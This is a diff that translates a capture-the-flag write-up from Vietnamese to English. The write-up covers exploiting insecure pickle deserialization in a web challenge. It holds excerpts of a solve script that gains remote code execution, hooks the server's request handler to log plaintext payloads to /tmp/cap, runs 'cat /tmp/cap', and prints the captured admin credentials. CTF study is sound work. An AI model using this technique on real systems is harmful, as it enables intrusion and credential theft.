@@ -11,45 +11,45 @@ draft: false
 
 ![](./image.png)
 
-### Phân tích source
+### Source analysis
 
-Đọc source challenge, ứng dụng nhận payload qua URL, sau đó decode bằng hàm kiểu như sau:
+Reading the challenge source, the application receives a payload via the URL, then decodes it with a function like:
 
 ```python
 payload = secretpickle_load(data)
 ```
 
-Trong đó `secretpickle_load()` thực chất dùng `pickle.loads()` sau khi base64 decode và XOR dữ liệu.
+Here `secretpickle_load()` actually uses `pickle.loads()` after base64-decoding and XOR-ing the data.
 
-Vấn đề là `pickle.loads()` không an toàn với dữ liệu do user kiểm soát. Nếu attacker tạo được object có `__reduce__()`, quá trình unpickle có thể gọi tới hàm tùy ý và dẫn tới RCE.
+The problem is that `pickle.loads()` is unsafe with user-controlled data. If the attacker can craft an object with `__reduce__()`, the unpickling process can call an arbitrary function and lead to RCE.
 
-Challenge cố che giấu pickle bằng cách:
+The challenge tries to hide the pickle by:
 
-1. Bỏ một prefix cố định của pickle object.
-2. XOR phần còn lại với một key cố định.
-3. Base64 encode dữ liệu.
+1. Removing a fixed prefix of the pickle object.
+2. XOR-ing the rest with a fixed key.
+3. Base64-encoding the data.
 
-Nhưng vì prefix và XOR key đều nằm trong source nên ta có thể tự tạo payload hợp lệ.
+But since the prefix and XOR key are both in the source, we can craft a valid payload ourselves.
 
-Các giá trị cần dùng:
+The values needed:
 
 ```python
-## default prefix that every pickled dict has; we don't need to send it every time
+# default prefix that every pickled dict has; we don't need to send it every time
 SECRETPICKLE_OBJECT_PREFIX = bytes.fromhex("8004 950000000000000000 7d 94 28")
 
-## 128 random bits, so same security as AES-128
+# 128 random bits, so same security as AES-128
 SECRETPICKLE_XOR_KEY = bytes.fromhex("77c07f8fd2ae7ad9f5aabc008c79d0d3")
 ```
 
-### Ý tưởng khai thác
+### Exploitation idea
 
-1. Dùng pickle RCE để hook hàm xử lý request chính trên server.
-2. Mỗi khi server nhận payload đã unpickle, ghi lại plaintext payload đó vào `/tmp/cap`.
-3. Gọi action `adminbot` để bot tự login/whoami.
-4. Đọc lại `/tmp/cap` bằng RCE.
-5. Trong log sẽ có payload chứa username/password của adminbot, trong đó password chính là flag.
+1. Use pickle RCE to hook the main request-handling function on the server.
+2. Each time the server receives an unpickled payload, log that plaintext payload to `/tmp/cap`.
+3. Call the `adminbot` action to make the bot log in / whoami itself.
+4. Read back `/tmp/cap` via RCE.
+5. The log will contain a payload with the adminbot's username/password, where the password is the flag.
 
-#### Script solve
+#### Solve script
 
 ```python
 #!/usr/bin/env python3
@@ -112,7 +112,7 @@ def rce_sh(cmd):
     })["result"][8:-2]
 
 
-## 1. Hook live FastAPI handler and log plaintext payloads
+# 1. Hook live FastAPI handler and log plaintext payloads
 rce_exec(r'''
 import sys
 
@@ -135,7 +135,7 @@ for m in list(sys.modules.values()):
 ''')
 
 
-## 2. Trigger adminbot
+# 2. Trigger adminbot
 target = b"http://127.0.0.1:80/?a=whoami"
 target_b64 = base64.b64encode(target).decode()
 
@@ -150,11 +150,11 @@ except Exception:
     pass
 
 
-## 3. Read captured payloads
+# 3. Read captured payloads
 print(rce_sh("cat /tmp/cap"))
 ```
 
-Kết quả:
+Result:
 
 ```text
 "{'a': 'hello', 'params': {'name': None}}\n{'a': 'adminbot', 'params': {'url': 'aHR0cDovLzEyNy4wLjAuMTo4MC8/YT13aG9hbWk='}}\n{'action': 'register', 'params': {'username': 'admin', 'password': 'GPNCTF{th3_PICKl3_wA5_s3cRE7_buT_nEv3r_53cuRe}'}}\n{'action': 'login', 'params': {'username': 'admin', 'password': 'GPNCTF{th3_PICKl3_wA5_s3cRE7_buT_nEv3r_53cuRe}'}}\n{'action': 'whoami', 'params': {}, 'username': 'admin', 'password': 'GPNCTF{th3_PICKl3_wA5_s3cRE7_buT_nEv3r_53cuRe}'}\n{'a': 'whoami', 'params': {}, 'username': 'admin', 'password': 'GPNCTF{th3_PICKl3_wA5_s3cRE7_buT_nEv3r_53cuRe}'}\n
